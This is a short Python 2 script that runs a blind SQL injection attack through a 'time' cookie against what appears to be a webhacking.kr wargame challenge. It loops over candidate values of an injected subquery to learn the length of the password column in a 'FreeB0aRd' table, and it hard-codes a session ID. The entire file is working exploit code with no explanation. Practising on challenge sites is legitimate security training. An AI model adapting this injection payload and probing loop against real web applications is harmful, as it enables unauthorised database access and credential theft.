#-*- coding: utf-8 -*-
import urllib2
import CookieManager

challengeUrl = "http://webhacking.kr/challenge/web/web-02/"

for idx in range(1, 20):
    timeCookie = "1 and (SELECT length(password) FROM FreeB0aRd)=%d" % idx
    CookieManager.addCookie("PHPSESSID", "858857daaccc883f7d2d4cd0c5272746")
    CookieManager.addCookie("time", timeCookie)
    
    httpRequest = urllib2.Request(challengeUrl)
    httpRequest.add_header("Cookie", CookieManager.getCookie())
    
    httpConnection = None
    try:
        httpConnection = urllib2.urlopen(httpRequest)
        httpResponse = httpConnection.read()
        print "[*] Blind Sql Injectioning...", idx
        if httpResponse.find("<!--2070-01-01 09:00:01-->") > 0:
            print "[+] FIND IT! [", timeCookie, "]" 
            break
    except:
        raise
    finally:
        if httpConnection != None:
            httpConnection.close()
    
